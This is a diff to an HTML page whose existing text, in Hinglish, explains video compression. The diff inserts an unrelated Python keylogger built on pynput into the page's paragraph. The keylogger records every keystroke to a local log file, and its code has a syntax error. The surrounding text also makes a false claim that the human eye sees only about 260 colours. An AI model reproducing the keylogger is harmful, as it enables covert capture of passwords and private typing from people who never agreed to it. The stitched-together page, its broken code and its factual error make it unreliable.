@@ -65,7 +65,51 @@
     
     Toh wah log itna lamba choda minimum 500 gb takk ka movie compress karke sirf 5 gb tkk kaise kar dete hai<br><br>
     Yeh issliye kyu ki human eye kuch limited colour hi dekh sakti hai yehi kuch sayad 260 colours but camera saare colors records kar sakta hai ek normal mobile bhi aaj-kal 16,777,216 possible colors display kar sakta. toh wah log at the time of compression sirf jo colors ek naked human eye nahi dekh saktti usse uss movie ke video se nikal dete hai yehi same chizz wah audio ke saath bhi karte hai as we know 20 se 20k hertz human sunn sakta hai toh wah below 20 and above 20k hertz ka sound nikal dete hai aur thoda bhot wah sound and color jo rah ke bhi kuch matter nahi karte aur video ki quality bhi kuch khaas affect nahi karte unhe bhi nikal dete hai, aur bhi extensions(mp4,mkv,webm) ke kuch secret algo rahta hai aur harr extension ka alag alag hotta hai 
-     
+
+	# keylogger using pynput module
+
+import pynput
+from pynput.keyboard import Key, Listener
+
+keys = []
+
+def on_press(key):
+	
+	keys.append(key)
+	write_file(keys)
+	
+	try:
+		print('alphanumeric key {0} pressed'.format(key.char))
+		
+	except AttributeError:
+		print('special key {0} pressed'.format(key))
+		
+def write_file(keys):
+	
+	with open('log.txt', 'w') as f:
+		for key in keys:
+			
+			# removing ''
+			k = str(key).replace("'", "")
+			f.write(k
+					
+			# explicitly adding a space after 
+			# every keystroke for readability
+			f.write(' ') 
+			
+def on_release(key):
+					
+	print('{0} released'.format(key))
+	if key == Key.esc:
+		# Stop listener
+		return False
+
+
+with Listener(on_press = on_press,
+			on_release = on_release) as listener:
+					
+	listener.join()
+
 </p>
 	<br><br>
 
